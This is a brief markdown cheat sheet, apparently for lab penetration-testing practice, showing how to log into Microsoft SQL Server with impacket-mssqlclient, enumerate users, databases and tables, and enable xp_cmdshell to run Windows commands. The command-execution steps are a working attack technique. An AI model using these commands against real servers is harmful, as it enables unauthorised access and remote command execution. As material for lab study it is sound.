# Connect to DB
```bash
$ impacket-mssqlclient Administrator:Lab123@192.168.182.18 -windows-auth
```
# enumerate
```bash
SQL> SELECT @@version; # show wersion
SQL> enum_users # show all users
SQL> select user_name(); # show current user
SQL> SELECT * FROM master.dbo.sysdatabases; # show databases and info
SQL> SELECT name FROM master.dbo.sysdatabases; # show databases
SQL> enum_db # show databases
SQL> SELECT * FROM <database_name>.information_schema.tables; # show tables of databas
SQL> select * from <database_name>.dbo.<table_name>; # show everything from table 
```
# Code Execution
```bash
SQL> EXECUTE sp_configure 'show advanced options', 1; # enable show advanced options
SQL> RECONFIGURE; # apply configurations
SQL> EXECUTE sp_configure 'xp_cmdshell', 1; # enable xp_cmdshell
SQL> RECONFIGURE; # apply configurations
SQL> EXECUTE xp_cmdshell 'whoami'; # execute any windows command
```